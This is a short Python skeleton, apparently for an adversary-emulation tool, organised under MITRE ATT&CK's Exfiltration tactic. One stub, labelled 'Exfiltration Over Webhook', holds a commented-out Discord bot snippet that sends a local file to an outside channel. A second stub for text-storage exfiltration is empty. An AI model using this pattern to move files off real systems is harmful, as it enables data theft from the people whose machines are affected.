
"""
Exfiltration
The adversary is trying to steal data.
https://attack.mitre.org/tactics/TA0010/
"""


def exfil_discord(platform):
    """
     T1567.004 Exfiltration Over Webhook
    """
    """
    import discord
    from discord.ext import commands
    bot = commands.Bot(command_prefix='!')

    @bot.event
    async def on_ready():
        print('We have logged in as {0.user}'.format(bot))
        channel = bot.get_channel(YOUR_CHANNEL_ID)  # replace with your channel id
        await channel.send(file=discord.File('file.txt'))  # replace 'file.txt' with your file

    bot.run('YOUR_TOKEN')  # replace 'YOUR_TOKEN' with your bot's token
    """
    pass



def exfil_textstorage(platform):
    """
    T1567.003  	Exfiltration to Text Storage Sites
    """
    pass